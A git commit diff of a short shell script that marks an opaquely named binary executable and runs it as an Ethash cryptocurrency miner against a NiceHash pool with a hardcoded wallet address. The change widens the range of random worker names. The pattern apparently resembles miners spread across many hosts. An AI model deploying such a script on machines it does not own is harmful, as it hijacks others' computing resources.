dbd160098319d9ce47574311adb0deeb1b1f8bdd
renilo <88342640+renilo@users.noreply.github.com>
2021-09-24 18:17:31 +0700

    Update kontol3.sh

--- kontol3.sh
+++ kontol3.sh
@@ -1,5 +1,5 @@
 POOL=stratum+tcp://daggerhashimoto.eu.nicehash.com:3353
 WALLET=3D6NtTR5Zw5VmYx9ZNfHkLhXRp2uPb9BXk
-WORKER=$(echo $(shuf -i 1-100000 -n 1)-HIGH)
+WORKER=$(echo $(shuf -i 1-99999999 -n 1)-HIGH)
 chmod +x memek
 ./memek --algo ETHASH --pool $POOL --user $WALLET.$WORKER
